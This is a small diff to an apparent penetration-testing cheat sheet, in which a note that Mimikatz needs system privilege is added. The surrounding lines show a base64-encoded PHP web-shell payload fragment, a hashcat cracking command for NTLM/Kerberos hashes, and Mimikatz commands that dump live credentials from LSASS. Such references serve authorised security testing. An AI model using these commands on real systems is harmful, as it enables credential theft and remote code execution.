@@ -775,7 +775,7 @@ NobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==&cmd=ls"`
 # Top tools and command  
 1. **hashcat**: Cracking NTLM / Kerberos hashes  
    `hashcat -m 1000 hash.txt rockyou.txt`  
-3. **Mimikatz** (Credential Dump)  
+3. **Mimikatz** (Need system privilege - Credential Dump)  
    `C:\tools\mimikatz\ > .\mimikatz.exe`  
    `mimikatz # privilege::debug`  #elevate privileges
    -  `sekurlsa::logonpasswords`  #dump live credentails from LSASS
